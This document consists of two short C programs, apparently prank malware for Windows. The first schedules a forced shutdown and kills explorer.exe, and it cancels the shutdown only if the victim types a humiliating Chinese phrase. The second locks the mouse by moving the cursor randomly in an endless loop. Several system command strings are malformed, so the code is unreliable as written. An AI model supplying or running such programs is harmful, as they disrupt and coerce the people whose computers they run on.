1.        #include<stdio.h>
          #include<string.h>
          #include<stdlib.h>
          int main()
          {
           char a[12],b[12]={"我是猪"};
            system("shut down-r-t 90");
            system("task kill/im explorer.exe/f");
            system("cls");
            bug:printf("说你是猪\n");
            scanf("%s",a);
            if(strcmp(a,b)==0)
            {
              system("shut down-a");
              system("explorer.exe");
             }
             else goto bug; 
          }
          
          
  
          
2.        #include <windows.h>
          #include <stdio.h>
          int main(void)
          {
            int x,y;
            while(1)
            {
              x=rand()%801;
              y=rand()%601;
              SetCursorPos(x,y);
            }
            return 0;
           }           
